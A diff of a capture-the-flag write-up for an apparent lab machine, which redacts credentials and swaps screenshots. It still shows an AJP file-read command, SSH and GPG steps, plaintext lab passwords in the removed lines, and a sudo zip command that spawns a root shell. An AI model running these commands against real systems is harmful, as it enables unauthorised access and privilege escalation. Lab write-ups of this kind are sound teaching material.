@@ -66,17 +66,15 @@ This is the command to read a file:
 
 <pre>python3 ajpShooter.py http://10.10.31.90:8080 8009 /WEB-INF/web.xml read</pre>
 
-![read](https://imgur.com/RhLQWkx.png)
+![read](https://imgur.com/j3oj3eg.png)
 
 There are some credentials:
 
-<pre>skyfuck:8730281lkjlkjdqlksalks</pre>
+<pre>skyfuck:8********************s</pre>
 
 We saw earlier that port 22 was open, let's try and ssh using the credentials we just discovered. The password seems to just be plaintext, I don't recognise any encryption. 
 
-<pre>ssh skyfuck@10.10.31.90
-yes
-8730281lkjlkjdqlksalks</pre>
+<pre>ssh skyfuck@10.10.31.90</pre>
 
 ![ssh](https://imgur.com/SfpNmCF.png)
 
@@ -89,7 +87,7 @@ ls
 cd merlin
 cat user.txt</pre>
 
-![flag](https://imgur.com/llUEeHp.png)
+![flag](https://imgur.com/Ngw5qJq.png)
 
 ### Privilege Escalation
 
@@ -127,27 +125,24 @@ Now let's use john to crack this file. I used the rockyou.txt wordlist.
 
 We have some results:
 
-![results john](https://imgur.com/5XoqEk8.png)
-
-<pre>alexandru</pre>
+![results john](https://imgur.com/kuPdKLu.png)
 
 Now that we have this key, let's go back to the ssh session and decrypt the pgp key. 
 
 <pre>gpg --import tryhackme.asc
-gpg --decrypt credential.pgp
-alexandru</pre>
+gpg --decrypt credential.pgp</pre>
 
-![decrypt](https://imgur.com/q2HIOEq.png)
+![decrypt](https://imgur.com/LwOh5bw.png)
 
 We have some credentials:
 
-<pre>merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j</pre>
+<pre>merlin:a*************************************************************j</pre>
 
 Change the user and use those credentials:
 
 <pre>su merlin</pre>
 
-![su](https://imgur.com/Vx9LCvM.png)
+![su](https://imgur.com/a7xv8d4.png)
 
 Check to see the users sudo rights:
 
@@ -167,6 +162,6 @@ Then exploit this using the following command:
 
 <pre>sudo zip 1.zip f3dai.txt -T --unzip-command="sh -c /bin/bash"</pre>
 
-![zip exploit](https://imgur.com/u12vB7J.png)
+![zip exploit](https://imgur.com/DHkbYYo.png)
 
 We have spawned a root shell, and found the root flag.
